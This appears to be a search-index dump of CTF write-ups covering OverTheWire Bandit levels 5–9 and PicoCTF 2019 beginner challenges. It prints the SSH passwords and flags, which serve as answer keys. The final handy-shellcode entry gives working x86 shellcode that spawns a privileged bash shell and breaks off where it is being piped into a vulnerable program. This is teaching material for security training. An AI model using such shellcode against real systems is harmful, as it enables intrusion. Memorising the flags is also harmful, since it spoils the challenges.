inhere/-file06: data inhere/-file07: ASCII text inhere/-file08: data inhere/-file09: data bandit4@bandit:~$ cat inhere/-file07 koReBOKuIDDepwhWk7jZC0RTdopnAYKh","title":"Level 5"},{"location":"Write-Ups/OverTheWire/Bandit/Level%205/#level-5","text":"","title":"Level 5"},{"location":"Write-Ups/OverTheWire/Bandit/Level%205/#objectives","text":"SSH to new user bandit4 Read the password from the only human-readable file in the inhere directory","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%205/#objective-1","text":"Username: bandit4 Password: pIwrPrtPN36QITSp3EQaw936yaFoFgAB Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit4@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%205/#objective-2","text":"If you're looking for a \"human-readable\" file, you're likely looking for an ASCII file. Do a file on all of the files in the inhere directory. bandit4@bandit:~$ file inhere/* inhere/-file00: data inhere/-file01: data inhere/-file02: data inhere/-file03: data inhere/-file04: data inhere/-file05: data inhere/-file06: data inhere/-file07: ASCII text inhere/-file08: data inhere/-file09: data bandit4@bandit:~$ cat inhere/-file07 koReBOKuIDDepwhWk7jZC0RTdopnAYKh","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%206/","text":"Level 6 Objectives SSH to the user bandit5 Read the password from a file that is in the inhere directory and has the following properties: human-readable 1033 bytes in size not executable Objective 1 Username: bandit5 Password: koReBOKuIDDepwhWk7jZC0RTdopnAYKh Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit5@bandit.labs.overthewire.org Success! Objective 2 There's a lot of directories here, so it would be best to use find to do a recursive search, while also searching for the most stringent property: 1033 bytes in size. Search for a file within the inhere directory with a size of 1033c (unit indicating bytes ) bandit5@bandit:~$ find inhere -type f -size 1033c inhere/maybehere07/.file2 bandit5@bandit:~$ cat inhere/maybehere07/.file2 DXjZPULLxYr17uwoI01bNLQbtFemEgo7","title":"Level 6"},{"location":"Write-Ups/OverTheWire/Bandit/Level%206/#level-6","text":"","title":"Level 6"},{"location":"Write-Ups/OverTheWire/Bandit/Level%206/#objectives","text":"SSH to the user bandit5 Read the password from a file that is in the inhere directory and has the following properties: human-readable 1033 bytes in size not executable","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%206/#objective-1","text":"Username: bandit5 Password: koReBOKuIDDepwhWk7jZC0RTdopnAYKh Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit5@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%206/#objective-2","text":"There's a lot of directories here, so it would be best to use find to do a recursive search, while also searching for the most stringent property: 1033 bytes in size. Search for a file within the inhere directory with a size of 1033c (unit indicating bytes ) bandit5@bandit:~$ find inhere -type f -size 1033c inhere/maybehere07/.file2 bandit5@bandit:~$ cat inhere/maybehere07/.file2 DXjZPULLxYr17uwoI01bNLQbtFemEgo7","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%207/","text":"Level 7 Objectives SSH to new user bandit6 Read password from file on the server that has the following properties: owned by user bandit7 owned by group bandit6 33 bites in size Objective 1 Username: bandit6 Password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit6@bandit.labs.overthewire.org Success! Objective 2 Going to have to use find again. Find a file starting at the root of the file system / with a size of 33c that's owned by the user bandit7 and the group bandit6 , then run stat on the output. Send any errors to /dev/null . bandit6@bandit:~$ find / -type f -size 33c -user bandit7 -group bandit6 -exec stat {} \\; 2 >/dev/null File: /var/lib/dpkg/info/bandit7.password Size: 33 Blocks: 8 IO Block: 4096 regular file Device: fb01h/64257d Inode: 920110 Links: 1 Access: ( 0640 /-rw-r----- ) Uid: ( 11007 / bandit7 ) Gid: ( 11006 / bandit6 ) Access: 2020 -03-23 07 :13:35.449665626 +0100 Modify: 2018 -10-16 14 :00:51.370867000 +0200 Change: 2018 -10-16 14 :00:51.370867000 +0200 Birth: - bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs","title":"Level 7"},{"location":"Write-Ups/OverTheWire/Bandit/Level%207/#level-7","text":"","title":"Level 7"},{"location":"Write-Ups/OverTheWire/Bandit/Level%207/#objectives","text":"SSH to new user bandit6 Read password from file on the server that has the following properties: owned by user bandit7 owned by group bandit6 33 bites in size","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%207/#objective-1","text":"Username: bandit6 Password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit6@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%207/#objective-2","text":"Going to have to use find again. Find a file starting at the root of the file system / with a size of 33c that's owned by the user bandit7 and the group bandit6 , then run stat on the output. Send any errors to /dev/null . bandit6@bandit:~$ find / -type f -size 33c -user bandit7 -group bandit6 -exec stat {} \\; 2 >/dev/null File: /var/lib/dpkg/info/bandit7.password Size: 33 Blocks: 8 IO Block: 4096 regular file Device: fb01h/64257d Inode: 920110 Links: 1 Access: ( 0640 /-rw-r----- ) Uid: ( 11007 / bandit7 ) Gid: ( 11006 / bandit6 ) Access: 2020 -03-23 07 :13:35.449665626 +0100 Modify: 2018 -10-16 14 :00:51.370867000 +0200 Change: 2018 -10-16 14 :00:51.370867000 +0200 Birth: - bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%208/","text":"Level 8 Objectives SSH to user bandit7 Find the password in the file data.txt next to the word millionth Objective 1 Username: bandit7 Password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit7@bandit.labs.overthewire.org Success! Objective 2 All you need to do is grep for millionth . bandit7@bandit:~$ ls data.txt bandit7@bandit:~$ grep millionth data.txt millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV","title":"Level 8"},{"location":"Write-Ups/OverTheWire/Bandit/Level%208/#level-8","text":"","title":"Level 8"},{"location":"Write-Ups/OverTheWire/Bandit/Level%208/#objectives","text":"SSH to user bandit7 Find the password in the file data.txt next to the word millionth","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%208/#objective-1","text":"Username: bandit7 Password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit7@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%208/#objective-2","text":"All you need to do is grep for millionth . bandit7@bandit:~$ ls data.txt bandit7@bandit:~$ grep millionth data.txt millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%209/","text":"Level 9 Objectives SSH to user bandit8 Read the password from file.txt , which is on the line that only occurs once Objective 1 Username: bandit8 Password: cvX2JJa4CFALtqS87jk27qwqGhBM9plV Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit8@bandit.labs.overthewire.org Success! Objective 2 You need to sort the file so you can organize the file, then all you need to do is pass the uniq command to pull out the one that occurs once. bandit8@bandit:~$ sort data.txt | uniq -u UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR","title":"Level 9"},{"location":"Write-Ups/OverTheWire/Bandit/Level%209/#level-9","text":"","title":"Level 9"},{"location":"Write-Ups/OverTheWire/Bandit/Level%209/#objectives","text":"SSH to user bandit8 Read the password from file.txt , which is on the line that only occurs once","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%209/#objective-1","text":"Username: bandit8 Password: cvX2JJa4CFALtqS87jk27qwqGhBM9plV Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit8@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%209/#objective-2","text":"You need to sort the file so you can organize the file, then all you need to do is pass the uniq command to pull out the one that occurs once. bandit8@bandit:~$ sort data.txt | uniq -u UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR","title":"Objective 2"},{"location":"Write-Ups/PicoCTF/2019/13/","text":"13 Challenge Cryptography can be easy, do you know what ROT13 is? cvpbPGS{abg_gbb_onq_bs_n_ceboyrz} Solution echo \"cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}\" | rot13 picoCTF{not_too_bad_of_a_problem}","title":"13"},{"location":"Write-Ups/PicoCTF/2019/13/#13","text":"","title":"13"},{"location":"Write-Ups/PicoCTF/2019/13/#challenge","text":"Cryptography can be easy, do you know what ROT13 is? cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/13/#solution","text":"echo \"cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}\" | rot13 picoCTF{not_too_bad_of_a_problem}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/2Warm/","text":"2Warm Challenge Can you convert the number 42 (base 10) to binary (base 2)? Solution echo \"obase=2;42\" | bc picoCTF{101010}","title":"2Warm"},{"location":"Write-Ups/PicoCTF/2019/2Warm/#2warm","text":"","title":"2Warm"},{"location":"Write-Ups/PicoCTF/2019/2Warm/#challenge","text":"Can you convert the number 42 (base 10) to binary (base 2)?","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/2Warm/#solution","text":"echo \"obase=2;42\" | bc picoCTF{101010}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/Based/","text":"Based Challenge To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with nc 2019shell1.picoctf.com 20836. Solution I used a bash script that utilized perl to convert binary to ascii. I would paste the array in as arguments. 1 2 3 4 5 6 7 8 9 10 11 #!/bin/bash array =( \" $@ \" ) string = '' for i in \" ${ array [@] } \" do string += $( echo $i | perl -lape '$_=pack\"(B8)*\",@F' ) done echo $string A second string is needed and it is octal, so I created another bash script that would take the input and convert it hex, then to ascii, mainly relying on xxd to do the ascii conversion. 1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash array =( \" $@ \" ) string = '' for i in \" ${ array [@] } \" do hex = $( echo \"obase=16;ibase=8; $i \" | bc ) string += $( echo \"0x $hex \" | xxd -r ) done echo $string Next portion was hex, and that was just a stripped version of the previous script. 1 2 3 4 5 6 7 8 9 10 11 #!/bin/bash array =( \" $@ \" ) string = '' for i in \" ${ array [@] } \" do string += $( echo \"0x $i \" | xxd -r ) done echo $string picoCTF{learning_about_converting_values_6cdcad0d}","title":"Based"},{"location":"Write-Ups/PicoCTF/2019/Based/#based","text":"","title":"Based"},{"location":"Write-Ups/PicoCTF/2019/Based/#challenge","text":"To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with nc 2019shell1.picoctf.com 20836.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/Based/#solution","text":"I used a bash script that utilized perl to convert binary to ascii. I would paste the array in as arguments. 1 2 3 4 5 6 7 8 9 10 11 #!/bin/bash array =( \" $@ \" ) string = '' for i in \" ${ array [@] } \" do string += $( echo $i | perl -lape '$_=pack\"(B8)*\",@F' ) done echo $string A second string is needed and it is octal, so I created another bash script that would take the input and convert it hex, then to ascii, mainly relying on xxd to do the ascii conversion. 1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash array =( \" $@ \" ) string = '' for i in \" ${ array [@] } \" do hex = $( echo \"obase=16;ibase=8; $i \" | bc ) string += $( echo \"0x $hex \" | xxd -r ) done echo $string Next portion was hex, and that was just a stripped version of the previous script. 1 2 3 4 5 6 7 8 9 10 11 #!/bin/bash array =( \" $@ \" ) string = '' for i in \" ${ array [@] } \" do string += $( echo \"0x $i \" | xxd -r ) done echo $string picoCTF{learning_about_converting_values_6cdcad0d}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/Bases/","text":"Bases Challenge What does this bDNhcm5fdGgzX3IwcDM1 mean? I think it has something to do with bases. Solution echo \"bDNhcm5fdGgzX3IwcDM1\" | base64 -d picoCTF{l3arn_th3_r0p35}","title":"Bases"},{"location":"Write-Ups/PicoCTF/2019/Bases/#bases","text":"","title":"Bases"},{"location":"Write-Ups/PicoCTF/2019/Bases/#challenge","text":"What does this bDNhcm5fdGgzX3IwcDM1 mean? I think it has something to do with bases.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/Bases/#solution","text":"echo \"bDNhcm5fdGgzX3IwcDM1\" | base64 -d picoCTF{l3arn_th3_r0p35}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/Easy1/","text":"Easy1 Challenge The one time pad can be cryptographically secure, but not when you know the key. Can you solve this? We've given you the encrypted flag, key, and a table to help UFJKXQZQUNB with the key of SOLVECRYPTO. Can you use this table to solve it?. Solution Looks like a Vigenere Cipher. Using the table and key for now and doing the manual way. picoCTF{CRYPTOISFUN} Less manual way would be in python3: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #!/usr/bin/env python3 import sys ciphertext = sys . argv [ 1 ] key = sys . argv [ 2 ] key_length = len ( key ) key_as_int = [ ord ( i ) for i in key ] ciphertext_int = [ ord ( i ) for i in ciphertext ] plaintext = '' for i in range ( len ( ciphertext_int )): value = ( ciphertext_int [ i ] - key_as_int [ i % key_length ]) % 26 plaintext += chr ( value + 65 ) print ( plaintext ) First argument would be your ciphertext, second would be the key.","title":"Easy1"},{"location":"Write-Ups/PicoCTF/2019/Easy1/#easy1","text":"","title":"Easy1"},{"location":"Write-Ups/PicoCTF/2019/Easy1/#challenge","text":"The one time pad can be cryptographically secure, but not when you know the key. Can you solve this? We've given you the encrypted flag, key, and a table to help UFJKXQZQUNB with the key of SOLVECRYPTO. Can you use this table to solve it?.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/Easy1/#solution","text":"Looks like a Vigenere Cipher. Using the table and key for now and doing the manual way. picoCTF{CRYPTOISFUN} Less manual way would be in python3: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #!/usr/bin/env python3 import sys ciphertext = sys . argv [ 1 ] key = sys . argv [ 2 ] key_length = len ( key ) key_as_int = [ ord ( i ) for i in key ] ciphertext_int = [ ord ( i ) for i in ciphertext ] plaintext = '' for i in range ( len ( ciphertext_int )): value = ( ciphertext_int [ i ] - key_as_int [ i % key_length ]) % 26 plaintext += chr ( value + 65 ) print ( plaintext ) First argument would be your ciphertext, second would be the key.","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/First%20Grep/","text":"First Grep Challenge Can you find the flag in file? This would be really tedious to look through manually, something tells me there is a better way. You can also find the file in /problems/first-grep_5_452e1c1630eb14b6753e9a155c3ae588 on the shell server. Solution grep 'picoCTF' file picoCTF{grep_is_good_to_find_things_887251c6}","title":"First Grep"},{"location":"Write-Ups/PicoCTF/2019/First%20Grep/#first-grep","text":"","title":"First Grep"},{"location":"Write-Ups/PicoCTF/2019/First%20Grep/#challenge","text":"Can you find the flag in file? This would be really tedious to look through manually, something tells me there is a better way. You can also find the file in /problems/first-grep_5_452e1c1630eb14b6753e9a155c3ae588 on the shell server.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/First%20Grep/#solution","text":"grep 'picoCTF' file picoCTF{grep_is_good_to_find_things_887251c6}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/First%20Grep_%20Part%20II/","text":"First Grep: Part II.md Challenge Can you find the flag in /problems/first-grep--part-ii_3_b4bf3244c2886de1566a28c1b5a465ae/files on the shell server? Remember to use grep. Solution Just need to recursive grep on the directory. grep -r picoCTF /problems/first-grep--part-ii_3_b4bf3244c2886de1566a28c1b5a465ae/files picoCTF{grep_r_to_find_this_3675d798}","title":"First Grep: Part II.md"},{"location":"Write-Ups/PicoCTF/2019/First%20Grep_%20Part%20II/#first-grep-part-iimd","text":"","title":"First Grep: Part II.md"},{"location":"Write-Ups/PicoCTF/2019/First%20Grep_%20Part%20II/#challenge","text":"Can you find the flag in /problems/first-grep--part-ii_3_b4bf3244c2886de1566a28c1b5a465ae/files on the shell server? Remember to use grep.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/First%20Grep_%20Part%20II/#solution","text":"Just need to recursive grep on the directory. grep -r picoCTF /problems/first-grep--part-ii_3_b4bf3244c2886de1566a28c1b5a465ae/files picoCTF{grep_r_to_find_this_3675d798}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/Flags/","text":"Flags.md Challenge What do the flags mean? Solution There are lots of flag symbols, but I started out searching for red diamond flag, which lead me down the search rabbit hole until I found all of them on one page ( Wikipedia ). PICOCTF{F1AG5AND5TUFF}","title":"Flags.md"},{"location":"Write-Ups/PicoCTF/2019/Flags/#flagsmd","text":"","title":"Flags.md"},{"location":"Write-Ups/PicoCTF/2019/Flags/#challenge","text":"What do the flags mean?","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/Flags/#solution","text":"There are lots of flag symbols, but I started out searching for red diamond flag, which lead me down the search rabbit hole until I found all of them on one page ( Wikipedia ). PICOCTF{F1AG5AND5TUFF}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/Glory%20of%20the%20Garden/","text":"Glory of the Garden Challenge This garden contains more than it seems. You can also find the file in /problems/glory-of-the-garden_5_eeb712a9a3bc1998ffcd626af9d63f98 on the shell server. Solution strings garden.jpg picoCTF{more_than_m33ts_the_3y3cD8bA96C}","title":"Glory of the Garden"},{"location":"Write-Ups/PicoCTF/2019/Glory%20of%20the%20Garden/#glory-of-the-garden","text":"","title":"Glory of the Garden"},{"location":"Write-Ups/PicoCTF/2019/Glory%20of%20the%20Garden/#challenge","text":"This garden contains more than it seems. You can also find the file in /problems/glory-of-the-garden_5_eeb712a9a3bc1998ffcd626af9d63f98 on the shell server.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/Glory%20of%20the%20Garden/#solution","text":"strings garden.jpg picoCTF{more_than_m33ts_the_3y3cD8bA96C}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/Insp3ct0r/","text":"Insp3ct0r Challenge Kishor Balan tipped us off that the following code may need inspection: https://2019shell1.picoctf.com/problem/63975/ (link) or http://2019shell1.picoctf.com:63975 Solution It tells you that you need to inspect the site. You are only given a third of the flag. The website had 3 different parts, HTML, CSS, and JS. Once you've inspected all of them, you had all of the flags. picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?d3db9182}","title":"Insp3ct0r"},{"location":"Write-Ups/PicoCTF/2019/Insp3ct0r/#insp3ct0r","text":"","title":"Insp3ct0r"},{"location":"Write-Ups/PicoCTF/2019/Insp3ct0r/#challenge","text":"Kishor Balan tipped us off that the following code may need inspection: https://2019shell1.picoctf.com/problem/63975/ (link) or http://2019shell1.picoctf.com:63975","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/Insp3ct0r/#solution","text":"It tells you that you need to inspect the site. You are only given a third of the flag. The website had 3 different parts, HTML, CSS, and JS. Once you've inspected all of them, you had all of the flags. picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?d3db9182}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/Lets%20Warm%20Up/","text":"Lets Warm Up Challenge If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII? Solution echo 0x70 | xxd -r picoCTF{p}","title":"Lets Warm Up"},{"location":"Write-Ups/PicoCTF/2019/Lets%20Warm%20Up/#lets-warm-up","text":"","title":"Lets Warm Up"},{"location":"Write-Ups/PicoCTF/2019/Lets%20Warm%20Up/#challenge","text":"If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII?","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/Lets%20Warm%20Up/#solution","text":"echo 0x70 | xxd -r picoCTF{p}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/Mr-Worldwide/","text":"Mr-Worldwide Challenge A musician left us a message. What's it mean? Solution If you resolve the coordinates and take the first letter of the city name, you'll get the flag. picoCTF{ (35.028309, 135.753082) (46.469391, 30.740883) (39.758949, -84.191605) (41.015137, 28.979530) (24.466667, 54.366669) (3.140853, 101.693207) _ (9.005401, 38.763611) (-3.989038, -79.203560) (52.377956, 4.897070) (41.085651, -73.858467) (57.790001, -152.407227) (31.205753, 29.924526) picoCTF{KODIAK_ALASKA}","title":"Mr-Worldwide"},{"location":"Write-Ups/PicoCTF/2019/Mr-Worldwide/#mr-worldwide","text":"","title":"Mr-Worldwide"},{"location":"Write-Ups/PicoCTF/2019/Mr-Worldwide/#challenge","text":"A musician left us a message. What's it mean?","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/Mr-Worldwide/#solution","text":"If you resolve the coordinates and take the first letter of the city name, you'll get the flag. picoCTF{ (35.028309, 135.753082) (46.469391, 30.740883) (39.758949, -84.191605) (41.015137, 28.979530) (24.466667, 54.366669) (3.140853, 101.693207) _ (9.005401, 38.763611) (-3.989038, -79.203560) (52.377956, 4.897070) (41.085651, -73.858467) (57.790001, -152.407227) (31.205753, 29.924526) picoCTF{KODIAK_ALASKA}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/Resources/","text":"Resources Challenge We put together a bunch of resources to help you out on our website! If you go over there, you might even find a flag! https://picoctf.com/resources (link) Solution Literally just read the page a little. picoCTF{r3source_pag3_f1ag}","title":"Resources"},{"location":"Write-Ups/PicoCTF/2019/Resources/#resources","text":"","title":"Resources"},{"location":"Write-Ups/PicoCTF/2019/Resources/#challenge","text":"We put together a bunch of resources to help you out on our website! If you go over there, you might even find a flag! https://picoctf.com/resources (link)","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/Resources/#solution","text":"Literally just read the page a little. picoCTF{r3source_pag3_f1ag}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/So%20Meta/","text":"So Meta Challenge Find the flag in this picture. You can also find the file in /problems/so-meta_1_ab9d99603935344b81d7f07973e70155. Solution Just need to strings the image. picoCTF{s0_m3ta_368a0341}","title":"So Meta"},{"location":"Write-Ups/PicoCTF/2019/So%20Meta/#so-meta","text":"","title":"So Meta"},{"location":"Write-Ups/PicoCTF/2019/So%20Meta/#challenge","text":"Find the flag in this picture. You can also find the file in /problems/so-meta_1_ab9d99603935344b81d7f07973e70155.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/So%20Meta/#solution","text":"Just need to strings the image. picoCTF{s0_m3ta_368a0341}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/The%20Factorys%20Secret/","text":"The Factory's Secret Challenge There appear to be some mysterious glyphs hidden inside this abandoned factory... I wonder what would happen if you collected them all? Solution","title":"The Factory's Secret"},{"location":"Write-Ups/PicoCTF/2019/The%20Factorys%20Secret/#the-factorys-secret","text":"","title":"The Factory's Secret"},{"location":"Write-Ups/PicoCTF/2019/The%20Factorys%20Secret/#challenge","text":"There appear to be some mysterious glyphs hidden inside this abandoned factory... I wonder what would happen if you collected them all?","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/The%20Factorys%20Secret/#solution","text":"","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/The%20Numbers/","text":"The Numbers Challenge The numbers... what do they mean? Solution 16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 } Character position in alphabet. 1 2 3 4 5 6 7 8 #!/usr/bin/evn python numbers = [ 16 , 9 , 3 , 15 , 3 , 20 , 6 , 20 , 8 , 5 , 14 , 21 , 13 , 2 , 5 , 18 , 19 , 13 , 1 , 19 , 15 , 14 ] numberlist = '' for i in numbers : numberlist += chr ( i + 96 ) print ( numberlist ) . upper () This gave me everything except the braces, which are easily put back in manually. PICOCTF{THENUMBERSMASON}","title":"The Numbers"},{"location":"Write-Ups/PicoCTF/2019/The%20Numbers/#the-numbers","text":"","title":"The Numbers"},{"location":"Write-Ups/PicoCTF/2019/The%20Numbers/#challenge","text":"The numbers... what do they mean?","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/The%20Numbers/#solution","text":"16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 } Character position in alphabet. 1 2 3 4 5 6 7 8 #!/usr/bin/evn python numbers = [ 16 , 9 , 3 , 15 , 3 , 20 , 6 , 20 , 8 , 5 , 14 , 21 , 13 , 2 , 5 , 18 , 19 , 13 , 1 , 19 , 15 , 14 ] numberlist = '' for i in numbers : numberlist += chr ( i + 96 ) print ( numberlist ) . upper () This gave me everything except the braces, which are easily put back in manually. PICOCTF{THENUMBERSMASON}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/Warmed%20Up/","text":"Warmed Up Challenge What is 0x3D (base 16) in decimal (base 10)? Solution echo \"ibase=16;3D\" | bc picoCTF{61}","title":"Warmed Up"},{"location":"Write-Ups/PicoCTF/2019/Warmed%20Up/#warmed-up","text":"","title":"Warmed Up"},{"location":"Write-Ups/PicoCTF/2019/Warmed%20Up/#challenge","text":"What is 0x3D (base 16) in decimal (base 10)?","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/Warmed%20Up/#solution","text":"echo \"ibase=16;3D\" | bc picoCTF{61}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/caesar/","text":"caesar Challenge Decrypt this message. You can find the ciphertext in /problems/caesar_3_33108a6b0f87eb4b3606437d06290815 on the shell server. Solution Quick bash script to find something that look readible. 1 2 3 4 5 6 7 #!/bin/bash str = 'ynkooejcpdanqxeykjrubvtagp' for i in { 1 ..20 } ; do echo $str | caesar $i done picoCTF{crossingtherubiconvyfzxekt}","title":"caesar"},{"location":"Write-Ups/PicoCTF/2019/caesar/#caesar","text":"","title":"caesar"},{"location":"Write-Ups/PicoCTF/2019/caesar/#challenge","text":"Decrypt this message. You can find the ciphertext in /problems/caesar_3_33108a6b0f87eb4b3606437d06290815 on the shell server.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/caesar/#solution","text":"Quick bash script to find something that look readible. 1 2 3 4 5 6 7 #!/bin/bash str = 'ynkooejcpdanqxeykjrubvtagp' for i in { 1 ..20 } ; do echo $str | caesar $i done picoCTF{crossingtherubiconvyfzxekt}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/dont-use-client-side/","text":"dont-use-client-side Challenge Can you break into this super secure portal? https://2019shell1.picoctf.com/problem/12280/ (link) or http://2019shell1.picoctf.com:12280 Solution If you browse to the page and check the source, you'll see the following and will be able to just piece it back together. if (checkpass.substring(0, split) == 'pico') { if (checkpass.substring(split*6, split*7) == '7743') { if (checkpass.substring(split, split*2) == 'CTF{') { if (checkpass.substring(split*4, split*5) == 'ts_p') { if (checkpass.substring(split*3, split*4) == 'lien') { if (checkpass.substring(split*5, split*6) == 'lz_5') { if (checkpass.substring(split*2, split*3) == 'no_c') { if (checkpass.substring(split*7, split*8) == '1}') { alert(\"Password Verified\") picoCTF{no_clients_plz_577431}","title":"dont-use-client-side"},{"location":"Write-Ups/PicoCTF/2019/dont-use-client-side/#dont-use-client-side","text":"","title":"dont-use-client-side"},{"location":"Write-Ups/PicoCTF/2019/dont-use-client-side/#challenge","text":"Can you break into this super secure portal? https://2019shell1.picoctf.com/problem/12280/ (link) or http://2019shell1.picoctf.com:12280","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/dont-use-client-side/#solution","text":"If you browse to the page and check the source, you'll see the following and will be able to just piece it back together. if (checkpass.substring(0, split) == 'pico') { if (checkpass.substring(split*6, split*7) == '7743') { if (checkpass.substring(split, split*2) == 'CTF{') { if (checkpass.substring(split*4, split*5) == 'ts_p') { if (checkpass.substring(split*3, split*4) == 'lien') { if (checkpass.substring(split*5, split*6) == 'lz_5') { if (checkpass.substring(split*2, split*3) == 'no_c') { if (checkpass.substring(split*7, split*8) == '1}') { alert(\"Password Verified\") picoCTF{no_clients_plz_577431}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/extensions/","text":"extensions Challenge This is a really weird text file TXT? Can you find the flag? Solution Just open up the \"txt\" file in a picture viewer. picoCTF{now_you_know_about_extensions}","title":"extensions"},{"location":"Write-Ups/PicoCTF/2019/extensions/#extensions","text":"","title":"extensions"},{"location":"Write-Ups/PicoCTF/2019/extensions/#challenge","text":"This is a really weird text file TXT? Can you find the flag?","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/extensions/#solution","text":"Just open up the \"txt\" file in a picture viewer. picoCTF{now_you_know_about_extensions}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/handy-shellcode/","text":"handy-shellcode Challenge This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_6_f0b84e12a8162d64291fd16755d233eb on the shell server. Source. Solution Looks like we need to just pipe in shellcode on the shell server, so I'm grabbing some shell code for just /bin/bash . I grabbed it from shell-storm . \"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\" I used python to output the byte code and cat to keep my standard in, then piped it into vuln . ( python -c 